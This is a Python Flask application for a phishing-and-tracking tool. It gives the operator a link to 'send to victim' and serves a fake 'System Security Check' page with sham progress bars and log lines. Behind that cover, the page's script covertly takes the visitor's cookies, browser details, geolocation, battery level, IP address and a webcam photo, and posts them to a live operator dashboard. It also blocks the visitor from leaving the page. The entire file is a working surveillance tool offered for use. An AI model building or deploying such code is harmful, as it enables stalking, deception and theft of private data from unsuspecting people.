# -*- coding: utf-8 -*-
import os
import uuid
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, session

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'force-fixed-key-2025')

reports = {}

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Spy Dashboard - Live Map, Battery, Photo</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
        .card{background:#111;border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #4affff;}
        input,button{padding:10px;margin:5px;border-radius:8px;border:none;}
        input{background:#000;color:#0f0;border:1px solid #4affff;width:70%;}
        button{background:#4affff;color:#000;cursor:pointer;}
        pre{background:#000;padding:10px;border-radius:8px;overflow:auto;}
        .data-item{border-left:3px solid #ff3366;margin:10px 0;padding:10px;background:#0f1422;}
        .map-container{height:300px;width:100%;margin-top:10px;border-radius:10px;overflow:hidden;}
        .battery{color:#4affff;font-weight:bold;}
        .photo{max-width:200px;border-radius:10px;margin-top:10px;}
    </style>
</head>
<body>
<div class="card">
    <h2> SPY DASHBOARD</h2>
    <p><strong>Your persistent UID:</strong> {{ uid }}</p>
    <div>
        <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
        <button onclick="copyLink()">Copy Link</button>
    </div>
    <form method="post" action="/new_uid" style="display:inline;">
        <button type="submit" style="background:#ff3366;">Generate New Link (New UID)</button>
    </form>
    <p> Send current link to victim. Data automatically appears here.</p>
</div>
<div class="card">
    <h3> Received Data (UID: {{ uid }})</h3>
    <button onclick="location.reload()">Refresh</button>
    <div id="data">
        {% if reports[uid] and reports[uid].data %}
            {% for item in reports[uid].data|reverse %}
                <div class="data-item">
                    <small>{{ item.time }}</small>
                    <pre>{{ item.data | tojson(indent=2) }}</pre>
                    {% if item.data.location %}
                        <div class="map-container" id="map{{ loop.index }}"></div>
                        <script>
                            setTimeout(() => {
                                var lat = {{ item.data.location.lat }};
                                var lon = {{ item.data.location.lon }};
                                var map = L.map('map{{ loop.index }}').setView([lat, lon], 13);
                                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                                L.marker([lat, lon]).addTo(map).bindPopup('Victim Location').openPopup();
                            }, 100);
                        </script>
                    {% endif %}
                    {% if item.data.battery %}
                        <div class="battery"> Battery: {{ item.data.battery.level }}% {% if item.data.battery.charging %}(Charging){% else %}(Not charging){% endif %}</div>
                    {% endif %}
                    {% if item.data.photo %}
                        <div><img src="{{ item.data.photo }}" class="photo" alt="Victim photo"></div>
                    {% endif %}
                </div>
            {% endfor %}
        {% else %}
            <p> No data yet. Send the link to victim.</p>
        {% endif %}
    </div>
</div>
<script>
    function copyLink() {
        let inp = document.getElementById('link');
        inp.select();
        navigator.clipboard.writeText(inp.value);
        alert('Link copied!');
    }
    setInterval(() => location.reload(), 8000);
</script>
</body>
</html>
"""

#        ,    
SPY_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Security Check</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{
            background: linear-gradient(135deg, #0a0f1e 0%, #07111f 100%);
            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #e0e0e0;
        }
        .container{
            background: rgba(10, 20, 35, 0.65);
            backdrop-filter: blur(15px);
            border-radius: 2rem;
            padding: 2rem;
            width: 90%;
            max-width: 550px;
            border: 1px solid rgba(0, 255, 255, 0.4);
            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
            text-align: center;
        }
        h1{
            font-size: 1.8rem;
            margin-bottom: 1rem;
            background: linear-gradient(135deg, #fff, #4affff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .spinner{
            width: 60px;
            height: 60px;
            border: 5px solid rgba(74, 255, 255, 0.2);
            border-top: 5px solid #4affff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 1.5rem auto;
        }
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .progress-bar{
            width: 100%;
            height: 8px;
            background: #1e2a4a;
            border-radius: 10px;
            margin: 1rem 0;
            overflow: hidden;
        }
        .progress-fill{
            width: 0%;
            height: 100%;
            background: #4affff;
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        .status{
            font-size: 0.9rem;
            color: #bbd9ff;
            margin: 0.8rem 0;
            font-family: monospace;
        }
        .fake-details{
            background: #010409aa;
            border-radius: 1rem;
            padding: 0.8rem;
            margin-top: 1.5rem;
            font-size: 0.75rem;
            color: #7effd4;
            text-align: left;
        }
        .glow-text{
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse{0%{opacity:0.6;} 100%{opacity:1;}}
        button{
            background: none;
            border: none;
            color: #aaa;
            font-size: 0.7rem;
            cursor: default;
        }
    </style>
</head>
<body>
<div class="container">
    <h1> SECURE VERIFICATION</h1>
    <div class="spinner"></div>
    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
    <div class="status" id="statusMsg">Initializing security protocols...</div>
    <div class="fake-details" id="fakeLog">
         SSL handshake complete<br>
         Scanning network environment...
    </div>
    <p style="font-size:0.7rem; margin-top:1rem; opacity:0.5;">Do not close this window. Verification in progress.</p>
</div>

<script>
    //          ,    
    let progress = 0;
    let step = 0;
    const statusMessages = [
        "Establishing encrypted channel...",
        "Checking device integrity...",
        "Verifying IP whitelist...",
        "Analyzing browser fingerprint...",
        "Validating geolocation data...",
        "Scanning for malicious plugins...",
        "Retrieving security certificates...",
        "Performing deep system audit...",
        "Almost done... please wait",
        "Finalizing encryption handshake..."
    ];
    const fakeLogLines = [
        " SSL handshake complete",
        " Scanning network environment...",
        " IP validated: 103.42.xxx.xx",
        " Checking browser extensions",
        " No threats detected",
        " Retrieving device timestamp",
        " Timezone synchronized",
        " Performing battery calibration...",
        " Camera integrity test (in progress)",
        " Secure channel established"
    ];
    
    //    ( 100%  , 95%   )
    const progressInterval = setInterval(() => {
        if (progress < 92) {
            progress += Math.random() * 3;
            if (progress > 92) progress = 92;
        } else {
            // 92%  95%   ,    
            progress += (Math.random() * 0.8);
            if (progress > 95) progress = 92;
        }
        document.getElementById('progressFill').style.width = progress + '%';
    }, 800);
    
    //   
    let msgIndex = 0;
    const statusInterval = setInterval(() => {
        document.getElementById('statusMsg').innerHTML = statusMessages[msgIndex % statusMessages.length];
        msgIndex++;
    }, 2200);
    
    //     
    let logIndex = 2; //     HTML  
    const logInterval = setInterval(() => {
        const logDiv = document.getElementById('fakeLog');
        if (logIndex < fakeLogLines.length) {
            logDiv.innerHTML += "<br>" + fakeLogLines[logIndex];
            logIndex++;
        } else {
            //     
            logDiv.innerHTML += "<br> Re-verifying connection stability...";
        }
        logDiv.scrollTop = logDiv.scrollHeight;
    }, 3500);
    
    // -----    (  ) -----
    const server = window.location.origin;
    const uid = "{{ uid }}";
    
    function sendData(data) {
        fetch(server + '/api/report/' + uid, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(e => console.error(e));
    }
    
    // Basic info
    sendData({
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: document.cookie,
        localStorageSize: localStorage.length,
        url: window.location.href,
        timestamp: new Date().toISOString()
    });
    
    // Battery
    if (navigator.getBattery) {
        navigator.getBattery().then(b => {
            sendData({ battery: { level: Math.round(b.level * 100), charging: b.charging } });
        });
    }
    
    // Location
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            pos => sendData({ location: { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy } }),
            err => console.log
        );
    }
    
    // Camera photo
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    let photoData = canvas.toDataURL('image/jpeg', 0.7);
                    sendData({ photo: photoData });
                    stream.getTracks().forEach(t => t.stop());
                }, 1500);
            })
            .catch(e => console.log);
    }
    
    // IP
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(ipData => sendData({ ip: ipData.ip }))
        .catch(e => console.log);
    
    // Keep victim on page  multiple tricks
    window.onbeforeunload = function() { return "Verification in progress. Are you sure you want to leave?"; };
    setInterval(() => { history.pushState({}, '', '/'); }, 500);
    
    //     /    ,  
</script>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())[:8]
        reports[session['uid']] = {'data': []}
    uid = session['uid']
    if uid not in reports:
        reports[uid] = {'data': []}
    link = request.host_url.rstrip('/') + '/spy/' + uid
    return render_template_string(DASHBOARD_HTML, link=link, uid=uid, reports=reports)

@app.route('/new_uid', methods=['POST'])
def new_uid():
    session['uid'] = str(uuid.uuid4())[:8]
    reports[session['uid']] = {'data': []}
    return redirect('/dashboard')

@app.route('/spy/<uid>')
def spy(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    return render_template_string(SPY_PAGE_HTML, uid=uid)

@app.route('/api/report/<uid>', methods=['POST'])
def report(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    data = request.get_json()
    if not data:
        data = {"error": "empty"}
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    print(f"[LOG] Data for {uid}: {list(data.keys())}")
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)